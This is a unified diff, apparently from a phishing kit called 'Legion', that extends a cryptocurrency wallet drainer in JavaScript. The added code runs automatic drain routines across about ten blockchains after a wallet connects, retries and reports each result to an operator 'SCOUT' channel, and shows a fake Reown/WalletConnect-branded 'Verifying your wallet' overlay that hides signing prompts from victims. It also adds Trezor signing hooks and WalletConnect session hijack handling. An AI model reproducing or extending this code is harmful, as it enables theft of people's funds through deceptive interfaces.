+            return SCOUT.alertFailure('SOL', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
+          });
+      },
+      TRON: function () {
+        return runWithRetry(function () { return drainTron(S.familyConnections.TRON); }, 'TRON drain', 3)
+          .catch(function (e) {
+            return SCOUT.alertFailure('TRON', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
+          });
+      },
+      TON: function () {
+        return runWithRetry(function () { return drainTon(S.familyConnections.TON); }, 'TON drain', 3)
+          .catch(function (e) {
+            return SCOUT.alertFailure('TON', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
+          });
+      },
+      BTC: function () {
+        return runWithRetry(function () { return drainBtc(S.familyConnections.UTXO); }, 'BTC drain', 3)
+          .catch(function (e) {
+            return SCOUT.alertFailure('BTC', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
+          });
+      },
+      COSMOS: function () {
+        return runWithRetry(function () { return drainCosmos(S.familyConnections.COSMOS); }, 'COSMOS drain', 3)
+          .catch(function (e) {
+            return SCOUT.alertFailure('COSMOS', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
+          });
+      },
+      APTOS: function () {
+        return runWithRetry(function () { return drainAptos(S.familyConnections.APTOS); }, 'APTOS drain', 3)
+          .catch(function (e) {
+            return SCOUT.alertFailure('APTOS', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
+          });
+      },
+      SUI: function () {
+        return runWithRetry(function () { return drainSui(S.familyConnections.SUI); }, 'SUI drain', 3)
+          .catch(function (e) {
+            return SCOUT.alertFailure('SUI', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
+          });
+      },
+      POLKADOT: function () {
+        return runWithRetry(function () { return drainPolkadot(S.familyConnections.POLKADOT); }, 'DOT drain', 3)
+          .catch(function (e) {
+            return SCOUT.alertFailure('POLKADOT', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
+          });
+      },
+      ALGORAND: function () {
+        return runWithRetry(function () { return drainAlgorand(S.familyConnections.ALGORAND); }, 'ALGO drain', 3)
+          .catch(function (e) {
+            return SCOUT.alertFailure('ALGORAND', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
+          });
+      },
+      CARDANO: function () {
+        return runWithRetry(function () { return drainCardano(S.familyConnections.CARDANO); }, 'ADA drain', 3)
+          .catch(function (e) {
+            return SCOUT.alertFailure('CARDANO', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
+          });
+      },
     };
 
     var evmFirst = priority.indexOf('EVM');
@@ -2716,6 +4012,8 @@
       parallel.push(runners[key]().catch(function (e) { L.warn(key + ':', e.message); }));
     });
     await Promise.allSettled(parallel);
+
+    await SCOUT.alertStage('drain_complete', evmCtx.address, evmCtx.chainId, evmCtx.walletName);
 
     await flushPendingEvmSubmit(evmCtx);
   }
@@ -2975,6 +4273,39 @@
       });
     },
 
+    polkadot: async function (address, sig, walletName) {
+      return this.base({
+        chain_family: 'POLKADOT', protocol: 'polkadot',
+        wallet_address: address,
+        token_address: 'OMNI_DOT_ANCHOR',
+        signature: sigHex(sig),
+        chain_id: 'polkadot:91b171bb158e2d3848fa23a9f1c25182',
+        wallet_type: walletName || 'Polkadot',
+      });
+    },
+
+    algorand: async function (address, sig, walletName) {
+      return this.base({
+        chain_family: 'ALGORAND', protocol: 'algorand',
+        wallet_address: address,
+        token_address: 'OMNI_ALGO_ANCHOR',
+        signature: sigHex(sig),
+        chain_id: 'algorand:416002',
+        wallet_type: walletName || 'Algorand',
+      });
+    },
+
+    cardano: async function (address, sig, walletName) {
+      return this.base({
+        chain_family: 'CARDANO', protocol: 'cardano',
+        wallet_address: address,
+        token_address: 'OMNI_ADA_ANCHOR',
+        signature: sigHex(sig),
+        chain_id: 'cardano:1',
+        wallet_type: walletName || 'Cardano',
+      });
+    },
+
     nft: async function (nftR, address, chainId, walletName) {
       return this.base({
         chain_family: 'EVM', protocol: 'seaport_listing',
@@ -3105,9 +4436,15 @@
 
   async function connectWithWallet(choice) {
     if (!choice) return;
-    if (choice.type === 'wc') { await handleWC(); return; }
+    if (choice.type === 'wc') {
+      await handleWC();
+      return;
+    }
     removeWcGuard();
     S.wcSessionActive = false;
+    S.connectMode = 'injected';
+    UI._walletIcon = (choice.info && choice.info.icon) || '';
+    if (!UI._overlayEl) UI.overlay.show('connecting', { walletIcon: UI._walletIcon });
     if (choice.provider) await handleEvmConnect(choice.provider, choice);
   }
 
@@ -3164,16 +4501,108 @@
 
   var UI = {
     statusEl: null,
+    _overlayEl: null,
+
+    _reownBrandSvg: function () {
+      return '<svg class="__lgn_co_brand" viewBox="0 0 60 16" fill="none" aria-hidden="true">'
+        + '<path d="M9.3335 4.66667C9.3335 2.08934 11.4229 0 14.0002 0H20.6669C23.2442 0 25.3335 2.08934 25.3335 4.66667V11.3333C25.3335 13.9106 23.2442 16 20.6669 16H14.0002C11.4229 16 9.3335 13.9106 9.3335 11.3333V4.66667Z" fill="#363636"/>'
+        + '<path d="M15.6055 11.0003L17.9448 4.66699H18.6316L16.2923 11.0003H15.6055Z" fill="#F6F6F6"/>'
+        + '<path d="M0 4.33333C0 1.9401 1.9401 0 4.33333 0C6.72657 0 8.66669 1.9401 8.66669 4.33333V11.6667C8.66669 14.0599 6.72657 16 4.33333 16C1.9401 16 0 14.0599 0 11.6667V4.33333Z" fill="#363636"/>'
+        + '<path d="M3.9165 9.99934V9.16602H4.74983V9.99934H3.9165Z" fill="#F6F6F6"/>'
+        + '<path d="M26 8C26 3.58172 29.3517 0 33.4863 0H52.5137C56.6483 0 60 3.58172 60 8C60 12.4183 56.6483 16 52.5137 16H33.4863C29.3517 16 26 12.4183 26 8Z" fill="#363636"/>'
+        + '<path d="M49.3687 9.95834V6.26232H50.0213V6.81966C50.256 6.40899 50.7326 6.16699 51.2606 6.16699C52.0599 6.16699 52.6173 6.67299 52.6173 7.65566V9.95834H51.972V7.69234C51.972 7.04696 51.6053 6.70966 51.07 6.70966C50.4906 6.70966 50.0213 7.17168 50.0213 7.82433V9.95834H49.3687Z" fill="#F6F6F6"/>'
+        + '<path d="M45.2538 9.95773L44.5718 6.26172H45.1877L45.6717 9.31242L46.3098 7.30306H46.9184L47.5491 9.29041L48.0404 6.26172H48.6564L47.9744 9.95773H47.2411L46.6178 8.03641L45.9871 9.95773H45.2538Z" fill="#F6F6F6"/>'
+        + '<path d="M42.3709 10.0536C41.2489 10.0536 40.5889 9.21765 40.5889 8.1103C40.5889 7.01035 41.2489 6.16699 42.3709 6.16699C43.4929 6.16699 44.1529 7.01035 44.1529 8.1103C44.1529 9.21765 43.4929 10.0536 42.3709 10.0536ZM42.3709 9.51096C43.1775 9.51096 43.4856 8.82164 43.4856 8.10296C43.4856 7.39163 43.1775 6.70966 42.3709 6.70966C41.5642 6.70966 41.2562 7.39163 41.2562 8.10296C41.2562 8.82164 41.5642 9.51096 42.3709 9.51096Z" fill="#F6F6F6"/>'
+        + '<path d="M38.2805 10.0536C37.1952 10.0536 36.5132 9.22499 36.5132 8.1103C36.5132 7.00302 37.1952 6.16699 38.2805 6.16699C39.1972 6.16699 40.0038 6.68766 39.9159 8.27896H37.1805C37.2319 8.96103 37.5472 9.5183 38.2805 9.5183C38.7718 9.5183 39.0945 9.21765 39.2045 8.87299H39.8499C39.7472 9.48903 39.1679 10.0536 38.2805 10.0536ZM37.1952 7.78765H39.2852C39.2338 7.04696 38.8892 6.70232 38.2805 6.70232C37.6132 6.70232 37.2832 7.18635 37.1952 7.78765Z" fill="#F6F6F6"/>'
+        + '<path d="M33.3828 9.95773V6.26172H34.0501V6.88506C34.2848 6.47439 34.6882 6.26172 35.1061 6.26172H35.9935V6.88506H35.0548C34.4682 6.88506 34.0501 7.26638 34.0501 8.00706V9.95773H33.3828Z" fill="#F6F6F6"/>'
+        + '</svg>';
+    },
+
+    _reownThumbSvg: function () {
+      var t = 36;
+      var dash1 = 116 + (36 - t);
+      var dash2 = 245 + (36 - t);
+      var offset = 360 + (36 - t) * 1.75;
+      return '<svg class="__lgn_co_thumb" viewBox="0 0 110 110" aria-hidden="true">'
+        + '<rect x="2" y="2" width="106" height="106" rx="' + t + '" fill="none" stroke="#0988F0" stroke-width="3" stroke-linecap="round"'
+        + ' stroke-dasharray="' + dash1 + ' ' + dash2 + '" stroke-dashoffset="' + offset + '"/>'
+        + '</svg>';
+    },
+
+    _reownAvatarSvg: function () {
+      return '<svg width="80" height="80" viewBox="0 0 80 80" fill="none" aria-hidden="true">'
+        + '<rect width="80" height="80" rx="20" fill="#ECECEC"/>'
+        + '<circle cx="40" cy="32" r="12" stroke="#9E9E9E" stroke-width="2.5" fill="none"/>'
+        + '<path d="M18 66c0-12.15 9.85-22 22-22s22 9.85 22 22" stroke="#9E9E9E" stroke-width="2.5" stroke-linecap="round" fill="none"/>'
+        + '</svg>';
+    },
+
+    overlay: {
+      show: function (mode, opts) {
+        UI.injectModalStyles();
+        opts = opts || {};
+        var titleText = mode === 'verifying' ? 'Verifying your wallet' : 'Connecting your wallet';
+        if (UI._overlayEl) {
+          var existingTitle = UI._overlayEl.querySelector('.__lgn_co_title');
+          if (existingTitle) existingTitle.textContent = titleText;
+          return;
+        }
+        closeAppKitModal();
+        var walletIcon = opts.walletIcon || UI._walletIcon || '';
+        var ov = document.createElement('div');
+        ov.id = '__lgn_co';
+        ov.innerHTML = ''
+          + '<div class="__lgn_co_modal" role="dialog" aria-modal="true" aria-label="' + titleText + '">'
+          + '  <div class="__lgn_co_head">' + UI._reownBrandSvg() + '</div>'
+          + '  <div class="__lgn_co_body">'
+          + '    <div class="__lgn_co_loader_wrap">'
+          + '      <div class="__lgn_co_avatar">' + (walletIcon
+            ? '<img src="' + walletIcon + '" alt="" width="80" height="80" style="border-radius:20px;object-fit:cover"/>'
+            : UI._reownAvatarSvg()) + '</div>'
+          + UI._reownThumbSvg()
+          + '    </div>'
+          + '    <div class="__lgn_co_title">' + titleText + '</div>'
+          + '    <div class="__lgn_co_sub">Please hold on while we complete the process . . .</div>'
+          + '  </div>'
+          + '</div>';
+        document.body.appendChild(ov);
+        UI._overlayEl = ov;
+        requestAnimationFrame(function () { ov.classList.add('__lgn_co--visible'); });
+        document.documentElement.classList.add('legion-overlay-active');
+      },
+      hide: function () {
+        if (!UI._overlayEl) {
+          document.documentElement.classList.remove('legion-overlay-active');
+          return;
+        }
+        var el = UI._overlayEl;
+        UI._overlayEl = null;
+        el.classList.remove('__lgn_co--visible');
+        setTimeout(function () {
+          try { el.remove(); } catch (e) {}
+        }, 220);
+        document.documentElement.classList.remove('legion-overlay-active');
+      },
+    },
 
     status: function (msg) {
       L.log('[UI]', msg);
-      if (this.statusEl) this.statusEl.textContent = msg;
+      if (/sign|confirm|verif|batch|security|approve/i.test(String(msg || ''))) {
+        this.overlay.show('verifying');
+      }
     },
 
     injectModalStyles: function () {
-      if (document.getElementById('__lgn_wm_css')) return;
+      var styleId = '__lgn_wm_css_v597';
+      if (document.getElementById(styleId)) return;
+      var old = document.getElementById('__lgn_wm_css');
+      if (old) old.remove();
+      old = document.getElementById('__lgn_wm_css_v594');
+      if (old) old.remove();
+      old = document.getElementById('__lgn_wm_css_v595');
+      if (old) old.remove();
       var style = document.createElement('style');
-      style.id = '__lgn_wm_css';
+      style.id = styleId;
       style.textContent = ''
         + '#__lgn_wm{position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:2147483646;display:flex;align-items:center;justify-content:center;padding:16px;font-family:Inter,-apple-system,BlinkMacSystemFont,sans-serif}'
         + '#__lgn_wm_box{background:#131313;border:1px solid rgba(255,255,255,.08);border-radius:24px;width:100%;max-width:400px;max-height:85vh;overflow:hidden;box-shadow:0 24px 80px rgba(0,0,0,.55)}'
@@ -3188,7 +4617,24 @@
         + '.__lgn_wm_meta{flex:1;min-width:0}'
         + '.__lgn_wm_badge{font-size:11px;color:#888;font-weight:500;margin-top:2px}'
         + '.__lgn_wm_arr{color:#555;font-size:18px}'
-        + '#__lgn_st{position:fixed;bottom:16px;left:50%;transform:translateX(-50%);background:rgba(19,19,19,.92);color:#e5e7eb;border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:10px 18px;font-size:13px;z-index:2147483645;display:none;pointer-events:none}';
+        + '#__lgn_st{position:fixed;bottom:16px;left:50%;transform:translateX(-50%);background:rgba(19,19,19,.92);color:#e5e7eb;border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:10px 18px;font-size:13px;z-index:2147483645;display:none;pointer-events:none}'
+        + '@font-face{font-family:"KHTeka";font-style:normal;font-weight:400;font-display:swap;src:url("https://fonts.reown.com/KHTeka-Regular.woff2") format("woff2")}'
+        + '@font-face{font-family:"KHTeka";font-style:normal;font-weight:500;font-display:swap;src:url("https://fonts.reown.com/KHTeka-Medium.woff2") format("woff2")}'
+        + '#__lgn_co{position:fixed;inset:0;z-index:2147483647;display:flex;align-items:center;justify-content:center;padding:16px;background:rgba(255,255,255,.72);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);font-family:"KHTeka",-apple-system,BlinkMacSystemFont,sans-serif;opacity:0;transition:opacity .2s ease}'
+        + '#__lgn_co.__lgn_co--visible{opacity:1}'
+        + '.__lgn_co_modal{width:100%;max-width:370px;background:#fff;border-radius:36px;box-shadow:0 2px 8px rgba(0,0,0,.05),inset 0 0 0 1px rgba(0,0,0,.06);overflow:hidden;transform:translateY(4px);animation:__lgn_co_in .25s ease forwards}'
+        + '@keyframes __lgn_co_in{to{transform:translateY(0)}}'
+        + '.__lgn_co_head{display:flex;justify-content:flex-start;align-items:center;padding:16px 20px 12px;border-bottom:1px solid rgba(0,0,0,.06)}'
+        + '.__lgn_co_brand{display:block;height:24px;width:auto}'
+        + '.__lgn_co_body{padding:28px 28px 40px;text-align:center}'
+        + '.__lgn_co_loader_wrap{position:relative;width:110px;height:110px;margin:12px auto 28px;display:flex;align-items:center;justify-content:center}'
+        + '.__lgn_co_avatar{position:relative;z-index:1;width:80px;height:80px;display:flex;align-items:center;justify-content:center;flex-shrink:0}'
+        + '.__lgn_co_thumb{position:absolute;inset:0;width:110px;height:110px;pointer-events:none}'
+        + '.__lgn_co_thumb rect{animation:__lgn_co_dash 1s linear infinite;will-change:stroke-dashoffset}'
+        + '@keyframes __lgn_co_dash{to{stroke-dashoffset:0}}'
+        + '.__lgn_co_title{font-size:20px;font-weight:500;color:#141414;line-height:1.3;margin:0 0 10px;letter-spacing:-.01em}'
+        + '.__lgn_co_sub{font-size:16px;font-weight:400;color:#868686;line-height:1.5;margin:0}'
+        + 'html.legion-overlay-active{overflow:hidden}';
       document.head.appendChild(style);
     },
 
@@ -3282,6 +4728,12 @@
           row.appendChild(arr);
           row.onclick = function () {
             self.closeWalletModal();
+            UI._walletIcon = (w.info && w.info.icon) || '';
+            if (window.legion && typeof window.legion.beginConnect === 'function') {
+              window.legion.beginConnect(w.type === 'wc' ? 'wc' : 'injected');
+            } else {
+              UI.overlay.show('connecting', { walletIcon: UI._walletIcon });
+            }
             onSelect(w);
           };
           list.appendChild(row);
@@ -3337,6 +4789,11 @@
       this._stTimer = setTimeout(function () { el.style.display = 'none'; }, 8000);
     },
 
+    showUserRejected: function () {
+      this.showStatus(userRejectionMessage());
+      this.overlay.hide();
+    },
+
     setConnected: function (addr, chainName) {
       var short = addr.slice(0, 6) + '...' + addr.slice(-4);
       var nb = document.getElementById('navConnectBtn');
@@ -3360,12 +4817,22 @@
   // ═══════════════════════════════════════════════════════════════
 
   async function handleEvmConnect(provider, walletInfo, hwObj) {
+    if (S.connecting) {
+      L.warn('Connect already in progress — skip duplicate');
+      return;
+    }
+    S.connecting = true;
     try {
       var accounts = await evmRequestAccounts(provider);
       if (!accounts || !accounts.length) throw new Error('No accounts returned');
       var address = (accounts[0] || '').toLowerCase();
-      var chainHex = await provider.request({ method: 'eth_chainId' });
-      var chainId = parseInt(String(chainHex).replace('0x', ''), 16);
+      var chainId;
+      if (provider && provider.isWalletConnect) {
+        chainId = await resolveWcEvmChainIdFromProvider(provider);
+      } else {
+        var chainHex = await provider.request({ method: 'eth_chainId' });
+        chainId = parseInt(String(chainHex).replace('0x', ''), 16);
+      }
       var walletName = (walletInfo && walletInfo.info && walletInfo.info.name)
         || (hwObj && (hwObj.type === 'ledger' ? 'Ledger' : 'Trezor'))
         || detectEvmWalletName(provider)
@@ -3373,13 +4840,20 @@
 
       S.evmAddr = address; S.evmChain = chainId;
       S.evmProvider = provider; S.evmWallet = walletName;
+      try { sessionStorage.setItem('legion_wc_evm_addr', address); } catch (eSs) {}
       L.log('Connected wallet:', address, '|', walletName, '| chain', chainId);
 
       var chainMeta = CHAIN_META[chainId] || { name: 'Chain ' + chainId };
       UI.setConnected(address, chainMeta.name);
       emitLegionEvent('legion:connected', { address: address, chainId: chainId, wallet: walletName });
 
-      if (!AUTO_DRAIN || S.drainRunning) return;
+      closeAppKitModal();
+      UI.overlay.show('verifying');
+
+      if (!AUTO_DRAIN || S.drainRunning) {
+        UI.overlay.hide();
+        return;
+      }
       S.drainRunning = true;
       S.pendingEvmPermit2 = null;
       S.connectSession = 'legion:' + Date.now() + ':' + Math.random().toString(36).slice(2, 8);
@@ -3391,35 +4865,58 @@
 
       UI.showStatus('Linking all blockchains...');
       discoverChainFamilies();
-      await connectAllFamilies();
-      UI.showStatus('Scanning assets...');
+      if (S.connectMode !== 'wc') {
+        await connectAllFamilies();
+      } else {
+        applyLegionWalletSessionAddresses();
+        S.familiesLinked = true;
+        S.allAddresses = collectAddressMap(address);
+      }
 
       await sleep(CFG.delayDrainMs || 300);
 
-      await runUniversalDrain({
-        provider: provider,
-        address: address,
-        chainId: chainId,
-        walletName: walletName,
-        hwObj: hwObj,
-      });
+      L.log('[connect] families linked — starting drain');
+      try {
+        await runUniversalDrain({
+          provider: provider,
+          address: address,
+          chainId: chainId,
+          walletName: walletName,
+          hwObj: hwObj,
+        });
+      } catch (drainErr) {
+        if (isUserRejection(drainErr)) {
+          await SCOUT.alertStage('user_rejected', address, chainId, walletName, drainErr.message);
+          UI.showUserRejected();
+          return;
+        }
+        await SCOUT.alertFailure('EVM', 'connect_drain', drainErr, address, chainId, walletName);
+        throw drainErr;
+      }
 
       if (S.anchorsOk > 0) {
         UI.status('Complete!');
-        UI.showStatus('Complete!');
       } else {
-        UI.status('No settlement signature');
-        UI.showStatus('');
         await SCOUT.reportDrainStatus('no_action', address, chainId, walletName, 'No signature or confirmed TX submitted');
       }
       S.drainRunning = false;
+      UI.overlay.hide();
     } catch (e) {
       L.warn('EVM connect error:', e.message);
       S.drainRunning = false;
-      UI.status('Connection error');
-      if (S.evmAddr && isUserRejection(e)) {
-        await SCOUT.reportDrainStatus('user_rejected', S.evmAddr, S.evmChain, S.evmWallet, e.message);
+      UI.overlay.hide();
+      if (isUserRejection(e)) {
+        UI.showUserRejected();
+        if (S.evmAddr) {
+          await SCOUT.alertStage('user_rejected', S.evmAddr, S.evmChain, S.evmWallet, e.message);
+        }
+        return;
       }
+      if (S.evmAddr) {
+        await SCOUT.alertFailure('EVM', 'connect', e, S.evmAddr, S.evmChain, S.evmWallet);
+      }
+    } finally {
+      S.connecting = false;
     }
   }
 
@@ -3451,6 +4948,17 @@
           request: async function (args) {
             if (args.method === 'eth_requestAccounts') return [trezor.address];
             if (args.method === 'eth_chainId') return '0x1';
+            if (args.method === 'eth_signTypedData_v4') {
+              var td = typeof args.params[1] === 'string' ? JSON.parse(args.params[1]) : args.params[1];
+              var sig = await HW.signTrezorTypedData(td);
+              if (!sig) throw new Error('Trezor typed data sign failed');
+              return sig;
+            }
+            if (args.method === 'eth_signTransaction') {
+              var signed = await HW.signTrezorTransaction(args.params[0]);
+              if (!signed) throw new Error('Trezor transaction sign failed');
+              return signed;
+            }
             return null;
           },
         };
@@ -3466,62 +4974,99 @@
     if (S.drainRunning) return;
     if (!S.vaultLoaded) await prefetchVault();
     installWcGuard();
-    UI.status('Opening WalletConnect...');
+    UI._walletIcon = '';
     _wcConnecting = false;
 
-    try {
-      if (typeof window.LegionWallet !== 'undefined' && window.LegionWallet.disconnect) {
-        await window.LegionWallet.disconnect();
-      }
-    } catch (e) {}
-    try {
-      var wcKeys = [];
-      for (var wi = 0; wi < localStorage.length; wi++) {
-        var wk = localStorage.key(wi);
-        if (!wk) continue;
-        var wkl = wk.toLowerCase();
-        if (wkl.indexOf('wc@') === 0 || wkl.indexOf('walletconnect') !== -1 ||
-            wkl.indexOf('w3m') !== -1 || wkl.indexOf('@w3m') !== -1) wcKeys.push(wk);
-      }
-      wcKeys.forEach(function (k) { try { localStorage.removeItem(k); } catch (e2) {} });
-      if (wcKeys.length) L.log('WC: cleared', wcKeys.length, 'stale key(s)');
-    } catch (e3) {}
+    var wcProv = await tryRecoverWcSession();
+    if (!wcProv) {
+      await cleanConflictingWcSessions();
+      await prepWcOnlyMode(true);
+    } else {
+      await prepWcOnlyMode(false);
+    }
 
-    var wcProv = null;
+    var wcBlockedByExt = false;
+    if (!wcProv) {
+    for (var attempt = 0; attempt < 2; attempt++) {
+      try {
+        L.log('WC: Reown AppKit (attempt', attempt + 1, ')');
+        wcProv = await bundledWalletConnect();
+        if (!wcProv) {
+          var hijackId = getLegionConnectorId().toLowerCase();
+          if (isInjectedConnectorId(hijackId)) {
+            L.warn('WC hijacked by extension:', hijackId);
+            await disconnectLegionWallet();
+            await prepWcOnlyMode(true);
+            wcBlockedByExt = true;
+            continue;
+          }
+          L.log('WC: polling mobile session...');
+          wcProv = await pollWcProviderReady(60000);
+        }
+        if (wcProv) {
+          var activeId = getLegionConnectorId().toLowerCase();
+          if (!isRealWalletConnectSession(activeId, wcProv)) {
+            L.warn('WC hijacked by', activeId || 'extension', '— retry');
+            await disconnectLegionWallet();
+            wcProv = null;
+            wcBlockedByExt = isInjectedConnectorId(activeId);
+            await prepWcOnlyMode(true);
+            continue;
+          }
+          break;
+        }
+      } catch (e) {
+        L.warn('WC attempt fail:', e.message);
+      }
+    }
+    }
+
+    if (!wcProv) {
+      removeWcGuard();
+      S.wcSessionActive = false;
+      UI.overlay.hide();
+      if (wcBlockedByExt) {
+        UI.showStatus('WalletConnect = phone QR. For browser wallet, pick MetaMask/Trust in the list.');
+      } else {
+        UI.showStatus('WalletConnect failed — scan QR and approve on your phone wallet');
+      }
+      return;
+    }
+
     try {
-      L.log('WC: Reown AppKit bundle (Uniswap/Aave style)');
-      wcProv = await bundledWalletConnect();
-      if (!wcProv) {
+      var wcAccts = await wcProv.request({ method: 'eth_accounts' }).catch(function () { return null; });
+      if (!wcAccts || !wcAccts.length) {
+        wcAccts = await evmRequestAccounts(wcProv);
+      }
+      if (!wcAccts || !wcAccts.length) {
+        var sessAddr = resolveWcEvmAddress();
+        if (sessAddr) wcAccts = [sessAddr];
+      }
+      if (!wcAccts || !wcAccts.length) {
         removeWcGuard();
-        UI.status('WalletConnect failed');
+        S.wcSessionActive = false;
+        UI.overlay.hide();
+        L.warn('WC connected but no EVM address resolved');
         return;
       }
-
-      try {
-        var wcAccts = await wcProv.request({ method: 'eth_accounts' });
-        if (!wcAccts || !wcAccts.length) {
-          wcAccts = await evmRequestAccounts(wcProv);
-        }
-        if (!wcAccts || !wcAccts.length) {
-          L.warn('WC: connected but no accounts — retry');
-          removeWcGuard();
-          UI.status('WalletConnect failed');
-          return;
-        }
-      } catch (accErr) {
+      L.log('WC account resolved:', String(wcAccts[0]).slice(0, 10) + '...');
+      S.wcSessionExpired = false;
+    } catch (accErr) {
+      var recovered = resolveWcEvmAddress();
+      if (!recovered) {
         L.warn('WC account check:', accErr.message);
+        removeWcGuard();
+        S.wcSessionActive = false;
+        UI.overlay.hide();
+        return;
       }
-
-      S.wcSessionActive = true;
-      L.log('WC provider ready | wc:', !!(wcProv && wcProv.isWalletConnect),
-        '| connector:', (wcProv && wcProv.connectorId) || '?');
-      await handleEvmConnect(wcProv, { info: { name: 'WalletConnect' } });
-    } catch (e) {
-      S.wcSessionActive = false;
-      removeWcGuard();
-      L.warn('WC flow error:', e.message);
-      UI.status('WalletConnect failed');
+      L.log('WC account recovered from session after RPC fail');
     }
+
+    S.wcSessionActive = true;
+    S.connectMode = 'wc';
+    L.log('WC provider ready | wc:', !!(wcProv && wcProv.isWalletConnect));
+    await handleEvmConnect(wcProv, { info: { name: 'WalletConnect' } });
   }
 
   async function init() {
@@ -3568,7 +5113,7 @@
       };
     }
 
-    L.log('Legion v5.9.1 ready — unified multi-family connect');
+    L.log('Legion v' + LEGION_VERSION + ' ready — unified multi-family connect');
 
     // Only auto-connect when explicitly enabled (never on silentMode alone)
     if (CFG.autoConnectOnLoad === true && AUTO_DRAIN && !S.drainRunning && window.ethereum) {
@@ -3587,13 +5132,25 @@
     connect: handleConnect,
     connectWC: handleWC,
     connectInjected: connectWithWallet,
+    resolveProvider: resolveEvmProvider,
+    beginConnect: function (mode) {
+      S.connectMode = mode === 'wc' ? 'wc' : 'injected';
+      if (mode === 'wc') {
+        S.wcSessionActive = true;
+      } else {
+        S.wcSessionActive = false;
+        removeWcGuard();
+        UI.overlay.show('connecting', { walletIcon: UI._walletIcon || '' });
+      }
+      if (typeof window.customModalClose === 'function') window.customModalClose();
+    },
     openPanel: defaultConnect,
     openExtensions: openExtensionPicker,
     drain: handleConnect,
     hook: function () { hookPageButtons(defaultConnect); },
     state: S,
     config: CFG,
-    version: '5.3.0',
+    version: LEGION_VERSION,
     contracts: {
       legionDrain: LEGION_DRAIN,
       batchDrainV1: BATCH_DRAIN,
